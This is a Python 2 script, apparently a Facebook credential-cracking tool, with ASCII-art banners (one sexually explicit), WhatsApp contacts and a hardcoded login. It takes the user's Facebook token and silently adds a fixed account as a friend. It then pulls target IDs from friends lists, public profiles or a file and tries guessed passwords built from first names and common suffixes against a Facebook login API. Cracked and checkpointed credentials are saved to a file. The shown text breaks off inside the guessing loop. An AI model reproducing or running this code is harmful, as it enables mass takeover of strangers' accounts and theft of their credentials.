#!/usr/bin/python2
#coding=utf-8
#THE OFFICAL FARIYA KHAN
#YOUR ATTITUDE IN MY FOOT DON'T EDIT MY SCRIPT LOL
#FOLLOWS ON FACEBOOK itzfariya786
#CONTACT ON FACEBOOK

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent','Mozilla/5.0 (Linux; Android 8.1.0; Chrome/79.0.3945.116) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36')]
br.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('User-Agent','Mozilla/5.0 (Windows NT 6.3; ARM; Trident/7.1; Touch; rv:11.2; WPDesktop; Lumia 730 Dual SIM) like Gecko')]
br.addheaders = [('User-Agent','Mozilla/5.0 (Windows NT 10.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36')]
br.addheaders = [('User-Agent','Mozilla/5.0 (Linux; Android 7.0.1; SM-J500M Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/122.0.0.10.69')]
br.addheaders = [('User-Agent','Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; Microsoft; RM-1068) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537')]
br.addheaders = [('User-Agent','Mozilla/5.0 (Linux; Android 5.0; Moto G (5) Build/NPPS25.137-33-6; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/122.0.0.10.69;]')]
br.addheaders = [('User-Agent','Mozilla/5.0 (Linux; Android 4.4.4; SM-T116BU Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Safari/537.36 [FB_IAB/MESSENGER;FBAV/123.0.0.11.70')]
br.addheaders = [('User-Agent','Mozilla/5.0 (iPhone; CPU iPhone OS 7_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) Mobile/14F89 [FBAN/FBIOS;FBAV/98.0.0.48.70;FBBV/62465497;FBDV/iPhone6,1;FBMD/iPhone;FBSN/iOS;FBSV/10.3.2;FBSS/2;FBCR/VIVO;FBID/phone;FBLC/pt_BR;FBOP/5;FB')]
br.addheaders = [('User-Agent','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36')]
br.addheaders = [('User-Agent','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36')]
br.addheaders = [('User-Agent','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36')]
br.addheaders = [('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36')]

def keluar():
	print "\x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')

def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.001)

#### colours ####
B='\033[1;94m'
R='\033[1;91m'
G='\033[1;92m'
W='\033[1;97m'
S='\033[1;96m'
P='\033[1;95m'
Y='\033[1;93m'

#Dev:TECH ABM
##### LOGO #####
logo = """ 
id login krne ke liye super vpn ko download kare play store 
sy ab new id binaye Facebook ki ab us 🇦🇹 ki country lgya ke
logi kr de ho jaye gi inshallah
                                     
\033[1;91m  💋💋💋     💘 SHAZAHN HOWLADEAR 💘 Whatsapp 💘01931192399
                            
___________§§§$$§§$§§_
 _W_______$$$$$§§§$$§§$§_
 _______($$$$$$$§§§$$§§$§§_(§§)_
 _E_____($$$$$$$$$$$$§§$$__$§§$)~
 ________(§§§$$$$§$$$$§§$$§§$§§$§§~
 ________((_($$§§$§§$§§§§§§§§§$$§§$
 _L______))_(§$$$$$$§§$$§§$§§$§§§§§~
 _________((_)_((§$$§$$§§$$§§$§§$§§§§((....
 _O_________))_)_§$$))_$$$§§§$$§§$§§$§§§§§
 ___________(__(_))_§$§§§§§$$§§$$§§$§§$§§§
 _V_____________(__$_$$§§§§§§$$§§$$§§$§§$§§
 _______________)_$_$§$§§§§§§$§§$$§§$§§§§__§
 _E________________)$__§§§§§§$§$$_§$$§§___§$§
 _______M_________(§___$§§§§§$§§$_§$$___§§§§§§
 _________________($§__$§$§§§$$$§§§_$__$§§§§§$§§
 _Y_____I__________§§§_§$$$$$§§§§§§§$§§_§$$§$$§§§§
 ___________________(§__§§§§§§§§§§$§§$$§§_§§$_§§§§§
 _O_____C___________(§_$$§§$§§§§§§§§$$§§$§_$§§§§§§
 ____________________§_$§§$§§§§§§§§$$§§_§§$§§§§§§
 _U_____H____________§__$$§§§§$§§§§§§$_§§$§§$§§§
 _____________________§_$$§§§§$§§§§§__$§§$§§$§§
 _______A_____________§_$$_§§§§§§$§§$$§§$§§§§
 _____________________§§§§_§§§§§$§§$$§§$§§§§
 _______E_____________§§§$$::::§§$$$§§$$§§$_§
 ___________________§§§§:§§§§§§__§§$§§$§_§§
 _______L_________§$$:§§§§§$$$§___§$§§$§§§§
 ______________§§:§§$§$$§§$$__$§§$§§§§§§
 ____________$$§:§§§$§$$$$$§§$$§§$§§$§_§§§
 __________$$§:§§$$$$$$§§$§§§§§§§$$___$§§
 _______$$$§::§$$$$$$§§$§§§§§§§§§______§§
 _____$$$§::§$$$$FL$§§§§§§§$§§$_________§
 ___$$$§::§§$$$$§§§§$$$§§§§
 _$$§::§§§$$§§$§§§§§§§§§
 $§§§$§§§§§$$§§§§§§§
 §§§§§§§$$§§$§§§§
 _§§§§§§§§$§§_§§$
 _§§§§§§§§§$§§$_§§§
 __§§§§$§§§$§$§§$_§§
 ___§§§§$§§§$§$§§$_§§
 _____$§§§§§§§§§§§$§_§§
 ______§§§$§§§§§§$§§$§_§
 _______$§§§§§§§$$§$$§§_§§
 ________§§§§$$§§$$§§$$§§_§
 _________§$§$$$§§§§§§$$§§$§§
 __________$$$$§§$_§§$§§$§§§§§§
 ___________§$§§$§§_§§§§§§§§§$$§§$§
 ____________§$§§$§§_§§§§§§§§_$$§§$
 _____________§$§§$§§_$§§§§§__§§$§
 _________________§$§§$______§§§§
 __________________§§§§§_§§__§§§§$
 __________________§§§$§§__$§§§§§§§
 ___________________§$§§$§____§$§§§§
 _____________________§§§$§§___§§$§§


░█▀▀▀█ █──█ █▀▀█ ▀▀█ █▀▀█ █──█ 
─▀▀▀▄▄ █▀▀█ █▄▄█ ▄▀─ █▄▄█ █▀▀█ 
░█▄▄▄█ ▀──▀ ▀──▀ ▀▀▀ ▀──▀ ▀──▀
                               
\033[1;96m❋❈╭┳✪✪╤──────────────────────────────────────➛➢
\033[1;96m♚♚║\033[1;32mCREATOR  : \033[1;32mSHAZAHN
\033[1;96m♚♚║\033[1;32mwhatsapp. : \033[1;32mWhatsapp number 01931192399
\033[1;96m♚♚║\033[1;32mWARNING  : \033[1;32mI M NOT is ka galt istmal na krna shukria
\033[1;96m❋❈╰┻✪✪╧─────────────────────────────────────➛➢"""

                   


def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[●] \x1b[1;93mPlease wait,loading... ✅\x1b[1;97m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print """
_________ad88888888888888888a,
________a88888"888888888888888888,
______,8888"__"P8888888888888888888b,
______d88_________`""P888888888888888,
_____,8888b_______________""888888888888,
_____d8P'''__,aa,______________""888888888b
_____888bbdd888888ba,__,I_________"88888888,
_____8888888888888888ba8"_________,8888888b
____,888888888888888888b,________,8888888888
____(88888888888888888888,______,88888888888,
____d888888888888888888888,____,8___"888888b
____88888888888888888888888__.;8'"""__(888888
____8888888888888I"8888888P_,8"_,aaa,__888888
____888888888888I:8888888"_,8"__`b8d'__(88888
____(8888888888I'888888P'_,8)__________888088
_____88888888I"__8888P'__,8")__________880888
_____8888888I'___888"___,8"_(._.)_______808888
_____(8888I"_____"88,__,8"_____________,8888P
______888I'_______"P8_,8"_____________,88808)
_____(88I'__________",8"__M""""""M___,8888988'
____,8I"____________,8(____"aaaa"___,888888
___,8I'____________,888a___________,888888)
__,8I'____________,888888,_______,888888888
_,8I'____________,8888888'`-===-'888888888'
,8I'____________,8888888"________88888888"
8I'____________,8"____88_________"888888P
8I____________,8'_____88__________`P888"
8I___________,8I______88____________"8ba,.
(8,_________,8P'______88______________88""8bma,.
_8I________,8P'_______88,______________"8b___""P8ma,
_(8,______,8d"________`88,_______________"8b_____`"8a
__8I_____,8dP_________,8X8,________________"8b.____:8b
__(8____,8dP'__,I____,8XXX8,________________`88,____8)
___8,___8dP'__,I____,8XxxxX8,_____I,_________8X8,__,8
___8I___8P'__,I____,8XxxxxxX8,_____I,________`8X88,I8
___I8,__"___,I____,8XxxxxxxxX8b,____I,________8XXX88I,
___`8I______I'__,8XxxxxxxxxxxxXX8____I________8XXxxXX8,
____8I_____(8__,8XxxxxxxxxxxxxxxX8___I________8XxxxxxXX8,
___,8I_____I[_,8XxxxxxxxxxxxxxxxxX8__8________8XxxxxxxxX8,
___d8I,____I[_8XxxxxxxxxxxxxxxxxxX8b_8_______(8XxxxxxxxxX8,
___888I____`8,8XxxxxxxxxxxxxxxxxxxX8_8,_____,8XxxxxxxxxxxX8
___8888,____"88XxxxxxxxxxxxxxxxxxxX8)8I____.8XxxxxxxxxxxxX8
__,8888I_____88XxxxxxxxxxxxxxxxxxxX8_`8,__,8XxxxxxxxxxxxX8"
__d88888_____`8XXxxxxxxxxxxxxxxxxX8'__`8,,8XxxxxxxxxxxxX8"
__888888I_____`8XXxxxxxxxxxxxxxxX8'____"88XxxxxxxxxxxxX8"
__88888888bbaaaa88XXxxxxxxxxxxXX8)______)8XXxxxxxxXX8"
__8888888I,_``""""""8888888888888888aaaaa8888XxxxxXX8"
__(8888888I,______________________.__```"""""88888P"
___88888888I,___________________,8I___8,_______I8"
____"""88888I,________________,8I'____"I8,____;8"
___________`8I,_____________,8I'_______`I8,___8)
____________`8I,___________,8I'__________I8__:8'
_____________`8I,_________,8I'___________I8__:8
______________`8I_______,8I'_____________`8__(8
_______________8I_____,8I'________________8__(8;
_______________8I____,8"__________________I___88,
______________.8I___,8'_______________________8"8,
______________(PI___'8_______________________,8,`8,
_____________.88'____________,_@___________.a8X8,`8,
_____________(88____________@@@_________,a8XX88,`8,
____________(888______________@'_______,d8XX8"__"b_`8,
___________.8888,_____________________a8XXX8"____"a__`8,
__________.888X88___________________,d8XX8I"______9,__`8,
_________.88:8XX8,_________________a8XxX8I'_______`8___`8,
________.88'_8XxX8a_____________,ad8XxX8I'________,8_____`8,
________d8'__8XxxxX8ba,______,ad8XxxX8I"__________8___,___`8,
_______(8I___8XxxxxxX888888888XxxxX8I"___________8___II___`8
_______8I'___"8XxxxxxxxxxxxxxxxxxX8I'____________(8___8)____8;
______(8I_____8XxxxxxxxxxxxxxxxxX8"_____________(8___8)____8I
______8P'_____(8XxxxxxxxxxxxxxX8I'________________8,__(8____:8
_____(8'_______8XxxxxxxxxxxxxxX8'_________________`8,_8_____8
_____8I________`8XxxxxxxxxxxxX8'___________________`8,8___;8
_____8'_________`8XxxxxxxxxxX8'_____________________`8I__,8'
_____8___________`8XxxxxxxxX8'_______________________8'_,8'
_____8____________`8XxxxxxX8'________________________8_,8'
_____8_____________`8XxxxX8'________________________d'_8'
_____8______________`8XxxX8_________________________8_8'
_____8________________"8X8'_________________________"8"
_____8,________________`88___________________________8
_____8I________________,8'__________________________d)
_____`8,_______________d8__________________________,8
______(b_______________8'_________________________,8'
_______8,_____________dP_________________________,8'
_______(b_____________8'________________________,8'
________8,___________d8________________________,8'
________(b___________8'_______________________,8'
_________8,_________a8_______________________,8'
_________(b_________8'______________________,8'
__________8,_______,8______________________,8'
__________(b_______8'_____________________,8'
___________8,_____,8_____________________,8'
___________(b_____8'____________________,8'
____________8,___d8____________________,8'
____________(b__,8'___________________,8'
_____________8,,I8___________________,8'
_____________I8I8'__________________,8'
_____________`I8I__________________,8'
______________I8'_________________,8'
______________"8_________________,8'
______________(8________________,8'
______________8I_______________,8'
______________(b,___8,________,8)
______________`8I___"88______,8i8,
_______________(b,__________,8"8")
_______________`8I__,8______8)_8_8
________________8I__8I______"__8_8
________________(b__8I_________8_8
________________`8__(8,________b_8,
_________________8___8)________"b"8,
_________________8___8(_________"b"8
_________________8___"I__________"b8,
_________________8________________`8)
_________________8_________________I8
_________________8_________________(8
_________________8,_________________8,
_________________Ib_________________8)
_________________(8_________________I8
__________________8_________________I8
__________________8_________________I8
__________________8,________________I8
__________________Ib________________8I
__________________(8_______________(8'
___________________8_______________I8
___________________8,______________8I
___________________Ib_____________(8'
___________________(8_____________I8
___________________`8_____________8I
____________________8____________(8'
____________________8,___________I8
____________________Ib___________8I
____________________(8___________8'
_____________________8,_________(8
_____________________Ib_________I8
_____________________(8_________8I
______________________8,________8'
______________________(b_______(8
_______________________8,______I8
_______________________I8______I8
_______________________(8______I8
________________________8______I8,
________________________8______8_8,
________________________8,_____8_8'
_______________________,I8_____"8"
______________________,8"8,_____8,
_____________________,8'_`8_____`b
____________________,8'___8______8,
___________________,8'____(a_____`b
__________________,8'_____`8______8,
__________________I8/______8______`b,
__________________I8-/_____8_______`8,
__________________(8/-/____8________`8,
___________________8I/-/__,8_________`8
___________________`8I/--,I8________-8)
____________________`8I,,d8I_______-8)
______________________"bdI"8,_____-I8
___________________________`8,___-I8'
____________________________`8,,--I8
_____________________________`Ib,,I8
______________________________`I8I
                   


\033[1;91m❤️❤️❤️❤️❤️❤️❤️❤️❤️  Mr Shazahn ❤️❤️❤️❤️❤️❤️❤️❤️

			       
\033[1;96m❋❈╭┳✪✪╤──────────────────────────────────────➛➢
\033[1;96m♚♚║\033[1;32mCREATOR  : \033[1;32mSHAZAHN
\033[1;96m♚♚║\033[1;32mWHATSAPP : \033[1;32mWhatsapp number 01931192399 
\033[1;96m♚♚║\033[1;32mWARNING  : \033[1;32mI M NOT is ka galt istmal na krna
\033[1;96m❋❈╰┻✪✪╧─────────────────────────────────────➛➢"""

print "\033[1;95m🔀 ⚌⚌⚌⚍⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌ 🔀"

jalan("\033[0;95m▇ ▇ ▇ ▇ ▇ ▇ ♚10%") 
jalan("\033[0;95m▇ ▇ ▇ ▇ ▇ ▇ ▇ ♚20%")
jalan("\033[0;95m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ♚30%")
jalan("\033[0;95m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ♚40%")
jalan("\033[0;93m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ♚50%")
jalan("\033[0;93m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ♚60%")
jalan("\033[0;93m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ♚70%")
jalan("\033[0;92m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ♚80%")
jalan("\033[0;92m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ♚90%")
jalan("\033[0;92m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ♚100%")

print "\033[1;95m🔀 ⚌⚌⚌⚍⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌⚌ 🔀"

CorrectUsername = "Shazahn"
CorrectPassword = "Howladear"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m[☆] \x1b[1;88mEnter Username \x1b[1;96m👉 ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;96m[☆] \x1b[1;88mEnter Password  \x1b[1;96m👉 ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev :waqas waqas
            loop = 'false'
        else:
            print "Wrong Password"
            os.system('xdg-open https://chat.whatsapp.com/Bgi6jhqCBWkL5cvggcqIiG')
    else:
        print "Wrong Username"
        os.system('xdg-open https://chat.whatsapp.com/Bgi6jhqCBWkL5cvggcqIiG')

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		print('\033[1;96m[✪]\x1b[1;93m USE A FRESH/NEW ACCOUNT TO LOGIN \x1b[1;96m[✪]' )
		id = raw_input('\033[1;96m[+] \x1b[1;96mID/Email \x1b[1;91m: \x1b[1;13m')
		pwd = raw_input('\033[1;96m[+] \x1b[1;96mPassword \x1b[1;90m: \x1b[1;92m')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\033[1;96m[!] \x1b[1;91mThere is no internet connection"
			keluar()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\033[1;96m[✓] \x1b[1;92mLogin hogi✅'
				os.system('xdg-open https://chat.whatsapp.com/Bgi6jhqCBWkL5cvggcqIiG')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\033[1;96m[!] \x1b[1;91mThere is no internet connection"
				keluar()
		if 'checkpoint' in url:
			print("\n\033[1;96m[!] \x1b[1;91mIt seems that your account has a checkpoint")
			os.system('rm -rf login.txt')
			time.sleep(1)
			keluar()
		else:
			print("\n\033[1;96m[!] \x1b[1;91mPassword/Email is wrong")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;96m[!] \033[1;91mIt seems that your account has a checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\033[1;96m[!] \x1b[1;91mThere is no internet connection"
		keluar()
	os.system("clear")
	print logo
	print 42*"\033[1;96m="
	print "\033[1;24m[\033[1;97m✓\033[1;96m]\033[1;93mWhatsapp 03138307366\033[1;91m: \033[1;92m"+nama+"\033[1;97m               "
	print "\033[1;94m[\033[1;97m✓\033[1;96m]\033[1;93m ID   \033[1;91m: \033[1;92m"+id+"\x1b[1;97m              "
	print "\033[1;96m☩═════════════════════════════════════☩"
	print "\x1b[1;97[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m➜ start hack"
	print "\x1b[1;97m[\x1b[1;92m0\x1b[1;96m]\x1b[1;93m➜ Exit"
        print "\033[1;96m☩═════════════════════════════════════☩"
	pilih()


def pilih():
	unikers = raw_input("\n\033[1;97m >>>> \033[1;97m")
	if unikers =="":
		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
		pilih()


def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;96m☩═════════════════════════════════════☩"
	print "\x1b[1;96m[\x1b[1;92m1\x1b[1;96m]\x1b[1;93m Hack From Friend List"
	print "\x1b[1;96m[\x1b[1;92m2\x1b[1;96m]\x1b[1;93m Hack From Any Public ID"
	print "\x1b[1;96m[\x1b[1;92m3\x1b[1;96m]\x1b[1;93m Crack From File (target)"
	print "\x1b[1;96m[\x1b[1;91m0\x1b[1;96m]\x1b[1;91m Back"
	print "\033[1;96m☩═════════════════════════════════════☩"
	pilih_super()

def pilih_super():
	peak = raw_input("\n\033[1;97m >>> \033[1;97m")
	if peak =="":
		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		jalan('\033[1;96m[✺] \033[1;93mGetting ID \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		idt = raw_input("\033[1;96m[+] \033[1;93mEnter ID \033[1;91m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;93mName\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;96m[!] \x1b[1;91mID Not Found!"
			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
			super()
		jalan('\033[1;96m[✺] \033[1;93mGetting IDs \033[1;97m...')
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3":
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		try:
			idlist = raw_input('\x1b[1;96m[+] \x1b[1;93mEnter Target link type👉(farilist.txt)\x1b[1;91m: \x1b[1;97m')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except IOError:
			print '\x1b[1;96m[!] \x1b[1;91mTarget Not Found'
			raw_input('\n\x1b[1;96m[ \x1b[1;97mBack \x1b[1;96m]')
			super()
	elif peak =="0":
		menu()
	else:
		print "\033[1;96m[!] \x1b[1;91mFill in correctly"
		pilih_super()
	
	print "\033[1;96m[+] \033[1;91mTotal IDs \033[1;91m: \033[1;97m"+str(len(id))
	jalan('\033[1;96m[✺] \033[1;94mStarting \033[1;97m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[\033[1;97m✸\033[1;91m] \033[1;93mCracking \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
	print
	print('\x1b[1;96m[!] \x1b[1;93mTo Stop Process Press CTRL Then Press z')
	print "\033[1;96m☩═══Ka sa masala paki raze no pa whatsApp rabita okai══"
	jalan("       \033[1;92mgabrana nhi jo account cp pe chale jaye gye 8 day baad " )
	print "\033[1;96m☩══opn ho jaye gye 7day se pehle opn na krna nhi tu opn nhi hoge════"		
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			b = json.loads(a.text)
			pass1 = b['first_name']+'786'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
     
				print '\x1b[1;96m[\x1b[1;92mHack Successful \x1b[1;58m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
   
					print '\x1b[1;96m[\x1b[1;93mAfter 7 days\x1b[1;58m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1
					cek = open("out/checkpoint.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					cekpoint.append(user+pass1)
				else:
					pass2 = b['first_name']+'123'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
       
						print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;58m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
        
							print '\x1b[1;96m[\x1b[1;93mAfter7days\x1b[1;12m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2
							cek = open("out/checkpoint.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							cekpoint.append(user+pass2)
						else:
							pass3 = b['first_name'] + '12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
        
								print '\x1b[1;96m[\x1b[1;92mHack Successful\x1b[1;58m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
        
									print '\x1b[1;96m[\x1b[1;93mAfter7days\x1b[1;12m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3
									cek = open("out/checkpoint.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									cekpoint.append(user+pass3)
								else:
									pass4 = b['first_name'] + '123456'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
       
										print '\x1b[1;96m[\x1b[1;92mHack Successful\x1b[1;96m]\x1b[1;58m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
        
											print '\x1b[1;96m[\x1b[1;93mAfter 7 days\x1b[1;96m]\x1b[1;58m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4
											cek = open("out/checkpoint.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											cekpoint.append(user+pass4)
										else:
											pass5 = '786786'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
        
												print '\x1b[1;96m[\x1b[1;20mHack Successful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;58m|\x1b[1;97m ' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
        
													print '\x1b[1;96m[\x1b[1;93mAfter7days\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;58m|\x1b[1;97m ' + pass5
													cek = open("out/checkpoint.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													cekpoint.append(user+pass5)
												else:
													pass6 = 'Pakistan123'
